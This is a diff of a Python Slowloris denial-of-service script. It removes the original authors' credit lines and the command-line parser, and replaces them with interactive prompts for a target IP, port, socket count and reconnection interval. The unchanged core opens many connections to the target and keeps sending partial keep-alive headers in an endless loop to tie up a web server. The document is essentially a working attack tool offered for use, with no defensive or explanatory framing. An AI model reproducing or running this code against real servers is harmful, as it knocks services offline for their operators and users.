@@ -1,9 +1,3 @@
-
-#!/usr/bin/env python
-
-# Original slowloris.py version v1.0 written by @wal99d
-# v2.0 updates by @brannondorsey
-
 import os
 import sys
 import random
@@ -12,7 +6,7 @@ import time
 import argparse
 
 regular_headers = [
-            "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+            "User-agent: Mozilla/5.0 (Windows NT 6.1; rv:37.0) Gecko/20100101 Firefox/41.0",
             "Accept-language: en-US,en,q=0.5"]
 
 def init_socket(host, port):
@@ -24,34 +18,26 @@ def init_socket(host, port):
         s.send('{}\r\n'.format(header).encode('UTF-8'))
     return s
 
-def parse_args():
-    parser = argparse.ArgumentParser(description='Slowloris DoS attack (python implementation)')
-    parser.add_argument('-i', '--host', type=str, required=True, help='target host')
-    parser.add_argument('-p', '--port', type=int, required=True,
-                        help='target port')
-    parser.add_argument('-s', '--max-sockets', dest='max_sockets', type=int, default=100, 
-                        help='maximum number of sockets connections to maintain with host')
-    parser.add_argument('-r', '--reconnection-rate', dest='reconnection_rate', type=int, default=10,
-                        help='seconds before socket reconnections')
-    parser.add_argument('-v', '--version', action='version', version='2.0')
-    return parser.parse_args()
 
 def main():
-    args = parse_args()
-    print("[*] creating {} socket connections...".format(args.max_sockets)) 
+    target_ip = input("Target IP: ")
+    target_port = int(input("Target Port: "))
+    max_sockets = int(input("Max sockets: "))
+    reconnection_time = int(input("Reconnection Time (seconds) : "))
+    print("creating "+str(max_sockets)+" connections...")
 
     socket_list=[]
-    for _ in range(args.max_sockets):
+    for _ in range(max_sockets):
         try:
-            s = init_socket(args.host, args.port)
+            s = init_socket(target_ip, target_port)
         except socket.error:
             break
         socket_list.append(s)
 
-    print("[+] {} socket connections created".format(len(socket_list))) 
+    print(str(len(socket_list))+"  socket connections created.")
 
     while True:
-        print("[*] sending \"Keep-Alive\" headers to {} connections".format(len(socket_list)))
+        print("sending 'Keep-Alive' headers to "+str(len(socket_list))+" connections")
         # send keep-alive headers to open connections
         for s in socket_list:
             try:
@@ -61,26 +47,26 @@ def main():
                 socket_list.remove(s)
 
         # reconnect disconnected sockets
-        if args.max_sockets - len(socket_list):
-            print('[*] creating {} new socket connections'.format(args.max_sockets - len(socket_list)))
+        if max_sockets - len(socket_list):
+            print('creating'+ str(max_sockets - len(socket_list))+ 'new socket connections')
             num_new_connections = 0
-            for _ in range(args.max_sockets - len(socket_list)):
+            for _ in range(max_sockets - len(socket_list)):
                 try:
-                    s=init_socket(args.host, args.port)
+                    s=init_socket(target_ip, target_port)
                     if s:
                         socket_list.append(s)
                         num_new_connections += 1
                 except socket.error:
                     break
-            print('[+] {} socket connections created'.format(num_new_connections))
-        print('[*] sleeping {} seconds...'.format(args.reconnection_rate))
-        time.sleep(args.reconnection_rate)
+            print(str(num_new_connections)+" socket connections created")
+        print('sleeping'+str(reconnection_time)+' seconds...')
+        time.sleep(reconnection_time)
 
 if __name__=="__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print('[!] exiting.')
+        print('exiting.')
         try:
             sys.exit(0)
         except SystemExit:
